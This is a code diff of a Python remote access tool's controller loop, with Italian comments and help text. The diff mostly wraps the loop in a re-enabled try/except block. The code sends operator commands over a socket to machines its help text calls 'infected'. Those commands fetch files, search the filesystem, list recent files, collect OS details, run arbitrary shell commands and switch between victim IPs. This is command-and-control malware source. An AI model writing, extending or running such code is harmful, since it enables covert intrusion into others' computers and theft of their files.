@@ -178,84 +178,84 @@ def main():
     global windowsFlag, pwd
     esc = False
     while not esc:
-        #try:
-        connectionSocket,serverSocket = StartConnection()  # apriamo connessione e inizializziamo
-        AssegnaWinFlag(connectionSocket)
-        connectionSocket.send("cd .".encode())
-        pwd = connectionSocket.recv(1024).decode()
-        help = "infoOs                          ricevi informazioni del sistema operativo\nsearch [nome file]              cerca un file nel " \
-                "filesystem \nget [nome file]                 scarica il file dal dispositivo infetto\nesc                             chiudi la " \
-                "sessione \nhelp                            guida comandi\ncd                              change directory\ndir/ls                          listing " \
-                "directory \ncls                             clear console\npwd                             print working directory \nsetOs to change osType" \
-                "\nrf [<data>YYYY-MM-DD]           mostra file più recenti [a partire da <data>]\nnsf [comando shell]             esegue comando shell [potrebbe crashare se non esiste]"
-        while not esc:
-            cmd = input('>>')
-            connectionSocket.send(cmd.encode())
+        try:
+            connectionSocket,serverSocket = StartConnection()  # apriamo connessione e inizializziamo
+            AssegnaWinFlag(connectionSocket)
+            connectionSocket.send("cd .".encode())
+            pwd = connectionSocket.recv(1024).decode()
+            help = "infoOs                          ricevi informazioni del sistema operativo\nsearch [nome file]              cerca un file nel " \
+                    "filesystem \nget [nome file]                 scarica il file dal dispositivo infetto\nesc                             chiudi la " \
+                    "sessione \nhelp                            guida comandi\ncd                              change directory\ndir/ls                          listing " \
+                    "directory \ncls                             clear console\npwd                             print working directory \nsetOs to change osType" \
+                    "\nrf [<data>YYYY-MM-DD]           mostra file più recenti [a partire da <data>]\nnsf [comando shell]             esegue comando shell [potrebbe crashare se non esiste]"
+            while not esc:
+                cmd = input('>>')
+                connectionSocket.send(cmd.encode())
 
-            if cmd == "cls":
-                print("cls")
-                clearScreen()
+                if cmd == "cls":
+                    print("cls")
+                    clearScreen()
 
-            elif "nsf" in cmd:
-                output = longRecv(connectionSocket)
-                print(output)
+                elif "nsf" in cmd:
+                    output = longRecv(connectionSocket)
+                    print(output)
 
-            elif cmd == "setOs":
-                global windowsFlag
-                windowsFlag = input()
+                elif cmd == "setOs":
+                    global windowsFlag
+                    windowsFlag = input()
 
-            elif cmd == "esc":
-                esc = exitNClose(connectionSocket, cmd)
-                break
+                elif cmd == "esc":
+                    esc = exitNClose(connectionSocket, cmd)
+                    break
 
-            elif "cd" in cmd:
-                changeDirectory(connectionSocket)
+                elif "cd" in cmd:
+                    changeDirectory(connectionSocket)
 
-            elif "get " in cmd:
-                fileName = cmd.replace("get ", "")
-                if not fileName == "":
-                    getFile(connectionSocket, fileName)
+                elif "get " in cmd:
+                    fileName = cmd.replace("get ", "")
+                    if not fileName == "":
+                        getFile(connectionSocket, fileName)
 
-            elif cmd == "infoOs":
-                d = longRecv(connectionSocket)
-                print(d)
-                LogOnFile("infoOs.txt", d)
+                elif cmd == "infoOs":
+                    d = longRecv(connectionSocket)
+                    print(d)
+                    LogOnFile("infoOs.txt", d)
 
-            elif "search" in cmd:
-                cmd = cmd + " "
-                toSearch = cmd.replace("search ", "")
-                searchFile(connectionSocket, toSearch)
+                elif "search" in cmd:
+                    cmd = cmd + " "
+                    toSearch = cmd.replace("search ", "")
+                    searchFile(connectionSocket, toSearch)
 
-            elif cmd == "help":
-                print(help)
+                elif cmd == "help":
+                    print(help)
 
-            elif cmd == "pwd":
-                print(pwd)
+                elif cmd == "pwd":
+                    print(pwd)
 
-            elif cmd == "rf" or "rf " in cmd:
-                if cmd == "rf":
-                    recentFiles(connectionSocket)
-                elif "rf " in cmd:
-                    data = cmd.replace("rf ", "")
-                    if data > time.strftime("%Y:%m:%d"):
-                        print("Too forward")
-                    else:
+                elif cmd == "rf" or "rf " in cmd:
+                    if cmd == "rf":
                         recentFiles(connectionSocket)
+                    elif "rf " in cmd:
+                        data = cmd.replace("rf ", "")
+                        if data > time.strftime("%Y:%m:%d"):
+                            print("Too forward")
+                        else:
+                            recentFiles(connectionSocket)
 
-            elif "dir" in cmd or "ls" in cmd:
-                output = longRecv(connectionSocket)
-                print(output)
-            elif cmd == "next":
-                connectionSocket,serverSocket = nextIp(connectionSocket,serverSocket)
-                connectionSocket.send("cd .".encode())
-                pwd = connectionSocket.recv(1024).decode()
+                elif "dir" in cmd or "ls" in cmd:
+                    output = longRecv(connectionSocket)
+                    print(output)
+                elif cmd == "next":
+                    connectionSocket,serverSocket = nextIp(connectionSocket,serverSocket)
+                    connectionSocket.send("cd .".encode())
+                    pwd = connectionSocket.recv(1024).decode()
 
 
 
-        '''except Exception as e:
+        except Exception as e:
             print(e)
             print("Errore! Riavvio in corso")
-            connectionSocket.close()'''
+            connectionSocket.close()
 
     connectionSocket.close()
 
